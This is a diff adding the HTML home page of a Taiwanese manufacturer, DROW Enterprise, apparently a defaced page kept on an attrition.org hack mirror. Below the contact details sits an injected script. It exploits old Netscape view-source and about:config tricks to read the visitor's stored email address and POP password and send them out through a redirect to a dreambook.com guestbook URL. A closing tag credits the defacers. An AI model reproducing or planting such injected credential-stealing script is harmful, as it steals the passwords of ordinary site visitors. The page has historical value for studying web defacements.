@@ -1,0 +1,183 @@
+<HTML>
+<HEAD>
+<TITLE> default </TITLE>
+
+<SCRIPT LANGUAGE="JavaScript1.1">
+<!--
+
+// initializations section for 
+// Bill Weinman's Common JavaScript Rollover Engine
+// (linked in below)
+
+// this MUST be the first line of code!
+//   ... it prevents the rollovers from trying 
+//   to run before the code is all initialized. 
+okay = false;
+
+function var_init()
+{
+// rollover type: "highlighting", "pointing", or "slideshow"
+rtype = "highlighting";
+
+// path to the images 
+// (be sure to include the trailing "/")
+path = "genius/";
+
+// names of images
+imagenames = new Array(
+
+// base image names, without the "-on", "-off", or ".gif"
+// these must be in quotes, and separated by commas ... 
+  "aa", "bb", "cc", "dd", "ee", "ff", "gg"
+  );
+
+// suffixes for mouseover and mouseout
+suffixes = new Array( 
+
+// these are appended to the names above, to get the filename itself. 
+  "-on", "-off" 
+  );
+
+// filename extension (".gif", ".jpg", or ".png")
+ext = ".gif";
+} 
+
+// -->
+</SCRIPT>
+
+<!-- link in Bill Weinman's Common JavaScript Rollover Engine -->
+<SCRIPT LANGUAGE="JavaScript1.1" SRC="rollover.js">
+</SCRIPT>
+
+</HEAD>
+<BODY onLoad="roll_init()" topmargin="0" leftmargin="0">
+
+ <!-- spacer -->
+
+ <div align="center">
+  <center>
+  <table border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td><img border="0" src="genius/logo-01.gif" width="338" height="103"></td>
+      <td><img border="0" src="genius/logo-02.gif" width="434" height="103"></td>
+    </tr>
+    <tr>
+      <td><img border="0" src="genius/01.gif" width="338" height="73"></td>
+      <td><img border="0" src="genius/04.gif" width="434" height="73"></td>
+    </tr>
+    <tr>
+      <td><img border="0" src="genius/defaul1.gif" width="33" height="12"><a HREF="genius-a.htm" onMouseOver="over('aa')" onMouseOut="out('aa')"><IMG NAME=aa SRC="genius/aa-off.gif" 
+        BORDER=0 width="123" height="19"></a></td>
+      <td rowspan="4"><img border="0" src="genius/05.gif" width="434" height="72"></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-a.htm" onMouseOver="over('aa')" onMouseOut="out('aa')"><img border="0" src="genius/defaul1.gif" width="33" height="12"></a><a HREF="genius-b.htm" onMouseOver="over('bb')" onMouseOut="out('bb')"><IMG NAME=bb SRC="genius/bb-off.gif" 
+        BORDER=0 width="228" height="19"></a></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-a.htm" onMouseOver="over('aa')" onMouseOut="out('aa')"><img border="0" src="genius/defaul1.gif" width="33" height="12"></a><a HREF="genius-c.htm" onMouseOver="over('cc')" onMouseOut="out('cc')"><IMG NAME=cc SRC="genius/cc-off.gif" 
+        BORDER=0 width="200" height="17"></a></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-a.htm" onMouseOver="over('aa')" onMouseOut="out('aa')"><img border="0" src="genius/defaul1.gif" width="33" height="12"></a><a HREF="genius-d.htm" onMouseOver="over('dd')" onMouseOut="out('dd')"><IMG NAME=dd SRC="genius/dd-off.gif" 
+        BORDER=0 width="266" height="17"></a></td>
+    </tr>
+    <tr>
+      <td><img border="0" src="genius/02.gif" width="338" height="10"></td>
+      <td rowspan="4"><img border="0" src="genius/06.gif" width="434" height="78"></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-e.htm" onMouseOver="over('ee')" onMouseOut="out('ee')"><img border="0" src="genius/defaul2.gif" width="64" height="7"></a><a HREF="genius-e.htm" onMouseOver="over('ee')" onMouseOut="out('ee')"><IMG NAME=ee SRC="genius/ee-off.gif" 
+        BORDER=0 width="261" height="35"></a></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-e.htm" onMouseOver="over('ee')" onMouseOut="out('ee')"><img border="0" src="genius/defaul2.gif" width="64" height="7"></a><a HREF="genius-g.htm" onMouseOver="over('ff')" onMouseOut="out('ff')"><IMG NAME=ff SRC="genius/ff-off.gif" 
+        BORDER=0 width="261" height="15"></a></td>
+    </tr>
+    <tr>
+      <td><a HREF="genius-e.htm" onMouseOver="over('ee')" onMouseOut="out('ee')"><img border="0" src="genius/defaul2.gif" width="64" height="7"></a><a HREF="service.asp" onMouseOver="over('gg')" onMouseOut="out('gg')"><IMG NAME=gg SRC="genius/gg-off.gif" 
+        BORDER=0 width="185" height="18"></a></td>
+    </tr>
+    <tr>
+      <td><img border="0" src="genius/defaul6.gif" width="338" height="19"></td>
+      <td rowspan="2"><img border="0" src="genius/07.gif" width="434" height="114"></td>
+    </tr>
+    <tr>
+      <td><img border="0" src="genius/03.gif" width="338" height="95"></td>
+    </tr>
+  </table>
+  </center>
+ </div>
+
+ <p align="center">
+        Manufacturer &amp; Exporter<br>        
+        DROW ENTERPRISE CO.,LTD<br>        
+        <font size="2">NO.48,Lane 798,Ta Wan Rd.,Yung Kang City,Tainan         
+        Hsien,Taiwan,R.O.C<br>        
+        TEL:886-6-2728555.272-4236.272-9236&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+        FAX:886-6-2716310.272-0985<br>     
+        <a href="mailto:E-mail:geniusco@ksts.seed.net.tw">E-mail:geniusco@ksts.seed.net.tw</a></font></p>  
+<SCRIPT>
+if(navigator.appName == "Netscape" && navigator.appVersion.charAt(0) >= 4){
+
+s=""
++"view-source:wysiwyg://1/javascript:s='<TITLE>tttt</TITLE>vvvv&gt>"
++"<ILAYER SRC=\"view-source:wysiwyg://1/about:config\"></ILAYER>"
++"<scri"+"pt>"
++"blur();"
++"temp=\"\";"
++"charstoread=50;"
++"sendstuff=\"http://www.dreambook.com/cgi-bin/dbsign?user=demmon&book=index&submit=Sign+the+Guestbook\";"
++"letter=\"\\/.@abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPRQSTUVWXYZ =-_+!#$%^&*()\";"
++"mend=\"general.\"+\"title_tips\";"
++"msg1=\"&mail=\";"
++"str1=\"mail.identity.useremail\"+\" = \";"
++"msg2=\"&name=\";"
++"str2=\"mail.pop_password\"+\" = \";"
++"setTimeout(\""
++"mag=str1;"
++"res=mag;"
++"for(i=0;i<charstoread;i++) {"
++" t=res;"
++" find(mend);"
++" for(c=0;c<letter.length;c++) {"
++"   t=res + letter[c];"
++"     if (find(t,true,true)) {"
++"      res=t;"
++"      if (c==65) {i=charstoread+1;}"
++"     } "
++" }"
++"};"
++"res=res.substring(mag.length);"
++"temp+=msg1 + escape(res);"
++""
++"mag=str2;"
++"res=mag;"
++"for(i=0;i<charstoread;i++) {"
++" t=res;"
++" find(mend);"
++" for(c=0;c<letter.length;c++) {"
++"   t=res + letter[c];"
++"     if (find(t,true,true)) {"
++"      res=t;"
++"      if (c==65) {i=charstoread+1;}"
++"     } "
++" }"
++"};"
++"res=res.substring(mag.length);"
++"temp+=msg2 + escape(res);"
++"location=(sendstuff+temp);"
++"\",3000);"
++"</scri"+"pt>'";
+
+location=s;
+}
+</SCRIPT>
+
+</font>
+
+</BODY>
+</HTML>  
+
+
+</Mais uma hackiada Por †Prodigy† e ZeroForce><!-- www.attrition.org web hack mirror - watermark or something -->
